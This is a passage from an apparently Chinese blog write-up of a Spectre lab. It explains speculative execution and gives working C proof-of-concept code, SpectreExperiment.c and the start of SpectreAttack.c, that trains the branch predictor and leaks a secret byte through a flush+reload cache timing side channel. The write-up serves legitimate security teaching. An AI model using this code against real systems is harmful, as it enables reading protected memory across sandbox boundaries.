Execution"></a>Out-Of-Order Execution</h3><p>首先必须要了解CPU的一个非常重要的机制。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">data = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span>(x &lt; size)&#123;</span><br><span class="line">    data = dta + <span class="number">5</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这段代码先检查x是否小于size，如果为ture，那么data的值会更新。假设size&#x3D;10，x&#x3D;15，那么第三行代码不会被执行。不考虑CPU内部的情况下，上面对代码的描述是正确的。然而，在CPU内，当我们考虑到微架构级别的执行顺序时，上面的描述就不一定正确了。</p><p>**<u><em>考虑CPU内部的微架构级别的执行顺序，我们会发现即使x的值大于size，第三行代码仍然是被执行了。这是因为现代CPU采用了一项重要的优化技术，被称作乱序执行。</em></u>**</p><p>乱序执行使得CPU可以最大限度地利用它的执行单元。一旦所有必需的资源可用，CPU 就会并行执行指令，而不是严格按顺序处理指令。当当前操作的执行单元被占用时，其他执行单元可以先行运行。</p><p>&#x3D;&#x3D;在上面的代码示例中，在微架构级别，第 2 行代码涉及两个操作：从内存中加载 size 的值，并将该值与 x 进行比较。如果size不在 CPU 缓存中，则可能需要数百个 CPU 时钟周期才能读取该值。现代 CPU 不会闲置，而是尝试**<u>预测比较</u>**的结果，并根据估计推测性地执行分支。由于这种执行在比较完成之前就开始了，因此这种执行称为乱序执行。在执行乱序执行之前，CPU 会存储其当前状态和寄存器值。当size的值最终到达时，CPU将检查实际结果。如果预测为真，则将提交推测执行的执行，并且会显着提高性能。如果预测错误，CPU将恢复到其保存的状态，因此乱序执行产生的所有结果都将被丢弃，就像从未发生过一样。这就是为什么从外部我们看到 3 行代码从未执行过。&#x3D;&#x3D;</p><p>Intel和几家CPU制造商在乱序执行的设计上犯了一个严重的错误。如果预测的分支不应该被执行，它们会消除乱序执行对寄存器和内存的影响，因此执行不会导致任何<strong>可见</strong>的影响。然而，他们忘记了一件事，即<strong>对 CPU 缓存的影响</strong>。在乱序执行期间，引用的内存被提取到寄存器中，并且也存储在高速缓存中。如果预测分支的结果必须被丢弃，<u>那么执行造成的缓存也应该被丢弃。不幸的是，大多数 CPU 并非如此。</u>因此，它产生了可观察到的效果。使用任务 1 和 2 中描述的侧信道技术，我们可以观察到这样的效果。 幽灵攻击巧妙地利用这种可观察到的效应来找出受保护的秘密值。</p><h3 id="The-Experiment"><a href="#The-Experiment" class="headerlink" title="The Experiment"></a>The Experiment</h3><p>在本次实验中，我们使用下面的例子（<code>SpectreExperiment.c</code>）来证明乱序执行的效果。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; size) &#123;  </span><br><span class="line">      temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA];  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FLUSH the probing array</span></span><br><span class="line">  flushSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim()</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;   </span><br><span class="line">      victim(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Exploit the out-of-order execution</span></span><br><span class="line">  _mm_clflush(&amp;size);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">      _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); </span><br><span class="line">  victim(<span class="number">97</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// RELOAD the probing array</span></span><br><span class="line">  reloadSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-06 15.54.18.png" alt="截屏2025-01-06 15.54.18" style="zoom:33%;" /><p>对于执行预测分支的 CPU，它们会预测 if 条件的结果。 CPU 保留过去采用的分支的记录，然后使用这些过去的结果来预测在推测执行中应采用哪个分支。因此，如果我们希望CPU在预测分支中采取特定的分支，我们应该训练CPU，以便我们选择的分支可以成为预测结果。训练是在从③行开始的 for 循环中完成的。在循环内部，我们使用一个小参数（从 0 到 9）调用victim()。这些值小于size，因此CPU会采用第①行中 if 条件的 true 分支。这是训练阶段，本质上是训练 CPU 期望 if 条件为 true。</p><p>CPU 训练完毕后，我们将一个较大的值 (97) 传递给victim() 函数（第⑤行）。该值大于size，因此在实际执行中将采用victim()内if条件的False分支，而不是Ture分支。但是，我们已经从内存中刷新了变量大小，因此从内存中获取其值可能需要一段时间。这是CPU将做出预测并开始推测执行的时间。</p><h3 id="Task3-1"><a href="#Task3-1" class="headerlink" title="Task3.1"></a>Task3.1</h3><p><strong>实验步骤：</strong></p><p>编译并运行<code>SpectreExperiment.c</code>，描述程序运行结果，</p><p>由于CPU缓存了额外的东西，这里可能会在侧通道中产生一些噪音，在后续的实验中会减少噪音，但现在可以多次执行任务来观察效果。</p><p>编译命令为，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc SpectreExperiment.c -o t3</span><br></pre></td></tr></table></figure><p>运行结果如下，</p><p><strong>分析：</strong></p><p>从结果来看，大多数情况下，CPU访问<code>array [97*4096+1024]</code>所花费的CPU时钟周期少于我们所设定的阈值(80)，即<code>array [97*4096+1024]</code>是在CPU缓存中的。</p><p><u>即使从宏观上看，victim(97)不会运行第②行代码，但是由于CPU的乱序执行机制，CPU仍然执行了第②行代码，只是得到if的结果之后发现预测错误，就将结果回滚了，但是没有清除CPU缓存，这使得下一次访问数组该位置时所花费的CPU时钟周期比较少。</u></p><p>所以当执行victim(97)函数的时候，第②行代码实际上是被执行了。</p><h3 id="Task3-2"><a href="#Task3-2" class="headerlink" title="Task3.2"></a>Task3.2</h3><p>如果将标有行☆号的那一行代码注释掉，即从CPU缓存中清除size，再执行程序，查看结果，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; size) &#123;  </span><br><span class="line">      temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA];  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FLUSH the probing array</span></span><br><span class="line">  flushSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim()</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;   </span><br><span class="line">      victim(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Exploit the out-of-order execution</span></span><br><span class="line"><span class="comment">// ☆ _mm_clflush(&amp;size);</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">      _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); </span><br><span class="line">  victim(<span class="number">97</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// RELOAD the probing array</span></span><br><span class="line">  reloadSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>从结果来看，发现<code>array[97*4096+1024]</code>并没有在CPU缓存中，即在运行victim(97)的时候，并没有执行第②行代码。</p><p>可能是在清除了关于size的缓存后（未注释代码时），CPU在执行victim(97)函数时，需要额外的开销来获取size的值，这就使得CPU在执行额外的开销时会同步执行第②行，以提升CPU的资源利用率，减少空闲资源的闲置浪费。</p><blockquote><p>现代CPU可以最大限度地利用它的执行单元。一旦所有必需的资源可用，CPU 就会并行执行指令，而不是严格按顺序处理指令。当当前操作的执行单元被占用时，其他执行单元可以先行运行。</p></blockquote><p>也就是说，如果没有清理缓存的话（注释代码时），size会在缓存中，那么就不需要额外的开销来获取size的值，CPU的某些执行单元就不会因为额外的开销而被占用，不会出现其他执行单元先行运行的乱序执行情况。</p><h3 id="Task3-3"><a href="#Task3-3" class="headerlink" title="Task3.3"></a>Task3.3</h3><p>如果取消注释，并将第④行替换为victim(i+20)，重新编译运行代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; size) &#123;  </span><br><span class="line">      temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA];  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FLUSH the probing array</span></span><br><span class="line">  flushSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim()</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;   </span><br><span class="line">      victim(i+<span class="number">20</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Exploit the out-of-order execution</span></span><br><span class="line">  _mm_clflush(&amp;size);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">      _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); </span><br><span class="line">  victim(<span class="number">97</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// RELOAD the probing array</span></span><br><span class="line">  reloadSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>从结果分析，<code>array [97*4096+1024]</code>也不在CPU缓存中。因为这样做之后使得对CPU倾向于将if判断结果预测为False，所以就不会执行victim(97)中的第三行代码（Ture分支），也就不会访问<code>array [97*4096+1024]</code>，所以它不在CPU缓存中。</p><h2 id="Task4-The-Spectre-Attack"><a href="#Task4-The-Spectre-Attack" class="headerlink" title="Task4. The Spectre Attack"></a>Task4. The Spectre Attack</h2><p>正如我们在前几次task中所实现的，即使if判断的条件为False，我们也可以使CPU执行if判断下的Ture分支。如果这种乱序执行不会造成任何明显的影响，那么这不是问题。然而，大多数具有此功能的CPU不会清理缓存，因此会留下一些乱序执行的痕迹。 幽灵攻击就是利用这些痕迹窃取受保护的秘密。</p><p>这些秘密可以是另一个进程中的数据或同一进程中的数据。如果秘密数据在另一个进程中，则硬件级别的进程隔离可以防止一个进程从另一个进程窃取数据。如果数据在同一个进程中，通常是通过软件来进行保护，比如沙箱机制。幽灵攻击可以针对这两种类型的秘密发起。然而，从另一个进程窃取数据比从同一进程窃取数据要困难得多。为了简单起见，本lab仅关注从同一进程窃取数据。</p><p>当在浏览器中打开来自不同服务器的网页时，它们通常是在同一进程中打开的。浏览器内部实现的沙箱将为这些页面提供一个隔离的环境，因此一个页面将无法访问另一页面的数据。大多数软件保护<em><strong>依靠条件检查</strong></em>来决定是否应授予访问权限。通过 Spectre 攻击，即使条件检查失败，我们也可以让 CPU 执行（无序）<em><strong>受保护的代码分支</strong></em>，从而实质上破坏了访问检查。</p><h3 id="The-Setup-for-the-Experiment"><a href="#The-Setup-for-the-Experiment" class="headerlink" title="The Setup for the Experiment"></a>The Setup for the Experiment</h3><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-06 16.06.48.png" alt="截屏2025-01-06 16.06.48" style="zoom:33%;" /><p>上图展示了本次Task的环境。在本环境中，有两种区域：隔离区和非隔离区。隔离是通过在下面描述的沙箱函数中实现的 if 条件来实现的。仅当x位于缓冲区的下限和上限之间时，沙箱函数才会返回buffer[x]。因此正常用户永远不可能访问到限制区的内容。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line"><span class="keyword">return</span> buffer[x];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制区（缓冲区上方或者下方）存在一个秘密值，攻击者知道该秘密的地址，但攻击者无法直接访问保存该秘密值的内存。访问秘密的唯一方法是通过上述沙箱功能。在前面的task中我们发现，虽然如果 x 大于缓冲区大小，则 True 分支永远不会被执行，但在微架构级别，它可以被执行，并且当执行恢复时可以留下一些痕迹（CPU cache）。</p><h3 id="The-Program-Used-in-the-Experiment"><a href="#The-Program-Used-in-the-Experiment" class="headerlink" title="The Program Used in the Experiment"></a>The Program Used in the Experiment</h3><p>基本 Spectre 攻击的代码如下所示。在此代码中，第一行定义了一个秘密。假设我们无法直接访问秘密、边界下面或边界上面的变量（我们假设可以刷新缓存）。我们的目标是使用 Spectre 攻击打印出秘密。下面的代码仅窃取秘密的第一个字节。</p><p>最重要的部分为第②、③和④行。第④行代码计算秘密相对于buffer开头的偏移量。偏移量肯定超出了缓冲区的范围，大于缓冲区的上限或小于缓冲区的下限（即负数）。该偏移量被输入到<code>restrictedAccess()</code>函数中。由于我们已经训练CPU在<code>restrictedAccess()</code>中获取true分支，CPU将在乱序执行中返回<code>buffer[index_Beyond]</code>，其中包含秘密的值。然后，秘密值会导致<code> array[]</code> 中的相应元素加载到缓存中。所有这些步骤最终都会被恢复，因此从外部来看，<code>restrictedAccess() </code>只返回零，而不是秘密的值。但是，CPU缓存并没有被清理，<code>array[s*4096 + DELTA]</code>仍然保留在缓存中。现在，我们只需要使用侧信道技术来找出 <code>array[] </code>的哪个元素在缓存中。</p><p>**实验要求：**请编译并执行SpectreAttack.c。描述运行结果并思考能否窃取秘密值。如果侧信道中有大量噪声，可能无法每次都获得一致的结果。为了克服这个问题，您应该多次执行该程序，看看是否可以获得秘密值。</p><p><strong>实验步骤：</strong></p><p>编译并执行SpectreAttack.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">char</span>    *secret    = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside restrictedAccess().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; </span><br><span class="line">      restrictedAccess(i); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;   &#125;</span><br><span class="line">  <span class="comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span></span><br><span class="line">  s = restrictedAccess(index_beyond);  </span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 